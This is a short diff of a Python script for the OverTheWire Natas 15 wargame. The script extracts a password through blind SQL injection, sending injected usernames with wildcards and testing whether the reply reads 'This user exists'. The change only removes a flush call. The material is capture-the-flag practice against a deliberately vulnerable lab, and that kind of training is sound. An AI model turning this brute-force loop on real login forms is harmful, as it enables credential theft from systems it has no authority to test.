@@ -16,8 +16,8 @@ while len(password) < 33:
         request = session.post('http://natas15.natas.labs.overthewire.org/', data={'username':sql_injection + password + character + "%"})
         if "This user exists" in request.text:
             sys.stdout.write(character)
-            sys.stdout.flush()
             password += character
             break
 
 print(password)
+
